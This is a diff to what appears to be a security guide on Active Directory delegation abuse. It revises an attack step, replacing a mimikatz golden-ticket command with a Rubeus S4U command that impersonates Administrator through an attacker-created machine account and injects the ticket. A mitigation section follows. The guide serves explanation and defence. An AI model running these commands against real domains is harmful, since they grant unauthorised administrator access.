@@ -82,10 +82,10 @@ New-ADComputer -Name "AttackerMachine" -SamAccountName "AttackerMachine" -Instan
 Set-ADComputer -Identity "VictimServer" -PrincipalsAllowedToDelegateToAccount "AttackerMachine"
 ```
 
-3. Inject a ticket:
+3. Use S4U2Self/S4U2Proxy to impersonate a privileged user and inject the resulting ticket, authenticating as the attacker-controlled machine account:
 
 ```powershell
-mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /target:<DC_IP> /rc4:<NTLM_HASH> /user:Administrator /ptt
+Rubeus.exe s4u /user:AttackerMachine$ /rc4:<AttackerMachine_NTLM_HASH> /impersonateuser:Administrator /msdsspn:<Target_SPN> /ptt
 ```
 
 **Mitigation:**
